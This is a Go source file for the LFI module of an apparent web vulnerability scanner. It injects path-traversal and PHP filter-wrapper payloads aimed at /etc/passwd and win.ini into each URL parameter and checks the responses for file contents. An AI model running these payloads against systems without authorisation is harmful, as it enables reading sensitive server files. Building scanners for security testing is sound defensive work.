package lfi

import (
	"io"

	"github.com/eonedge/vulnscan/pkg/crawler"
	"github.com/eonedge/vulnscan/pkg/scanner"
	"github.com/eonedge/vulnscan/pkg/utils"
)

// LFIModule implements Local File Inclusion vulnerability scanning
type LFIModule struct {
	CustomPayloads []utils.Payload
}

// NewLFIModule creates a new LFI module
func NewLFIModule() *LFIModule {
	return &LFIModule{}
}

// NewLFIModuleWithPayloads creates a new LFI module with custom payloads
func NewLFIModuleWithPayloads(payloads []utils.Payload) *LFIModule {
	return &LFIModule{CustomPayloads: payloads}
}

func (m *LFIModule) Name() string        { return "lfi" }
func (m *LFIModule) Description() string  { return "Local File Inclusion (LFI) vulnerability scanner" }

// Scan scans an endpoint for LFI vulnerabilities
func (m *LFIModule) Scan(client *utils.HTTPClient, endpoint crawler.Endpoint) []scanner.Vulnerability {
	var vulns []scanner.Vulnerability

	// LFI payloads
	payloads := []struct {
		payload    string
		pattern    string
		severity   scanner.Severity
		desc       string
	}{
		{
			payload:  "../../../etc/passwd",
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "LFI via path traversal to /etc/passwd",
		},
		{
			payload:  "..\\..\\..\\windows\\win.ini",
			pattern:  "\\[fonts\\]",
			severity: scanner.SeverityCritical,
			desc:     "LFI via path traversal to Windows win.ini",
		},
		{
			payload:  "/etc/passwd",
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "LFI via absolute path to /etc/passwd",
		},
		{
			payload:  "....//....//....//etc/passwd",
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "LFI via double encoding",
		},
		{
			payload:  "php://filter/convert.base64-encode/resource=/etc/passwd",
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "LFI via PHP filter wrapper",
		},
	}

	// Add custom payloads
	for _, cp := range m.CustomPayloads {
		pattern := cp.Pattern
		if pattern == "" {
			pattern = "root:.*:0:0:"
		}
		desc := cp.Description
		if desc == "" {
			desc = "Custom LFI payload"
		}
		payloads = append(payloads, struct {
			payload    string
			pattern    string
			severity   scanner.Severity
			desc       string
		}{
			payload:  cp.Value,
			pattern:  pattern,
			severity: scanner.SeverityCritical,
			desc:     desc,
		})
	}

	// Test each parameter
	for param := range endpoint.Params {
		for _, p := range payloads {
			// Inject payload into parameter
			testURL, err := utils.InjectParam(endpoint.URL, param, p.payload)
			if err != nil {
				continue
			}

			// Send request
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}

			// Read response body
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			// Check for LFI patterns
			if utils.ContainsPattern(bodyStr, p.pattern) {
				vuln := scanner.Vulnerability{
					Type:        "LFI",
					Severity:    p.severity,
					URL:         endpoint.URL,
					Parameter:   param,
					Payload:     p.payload,
					Description: p.desc,
					Evidence:    utils.ExtractContext(bodyStr, p.payload),
					Timestamp:   utils.GetCurrentTime(),
				}
				vulns = append(vulns, vuln)
			}
		}
	}

	return vulns
}
